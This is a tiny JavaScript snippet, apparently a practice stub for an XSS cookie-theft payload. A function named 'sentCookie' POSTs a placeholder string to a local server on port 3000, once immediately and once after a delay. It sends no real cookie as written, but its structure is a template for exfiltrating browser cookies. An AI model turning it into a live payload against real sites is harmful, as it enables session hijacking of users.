sentCookie();
function sentCookie(){
  var url = "http://localhost:3000";
  var httpRequest = new XMLHttpRequest();
  httpRequest.open('POST', url, true);
  httpRequest.send("aaaa");
}
setTimeout(sentCookie, 1000);
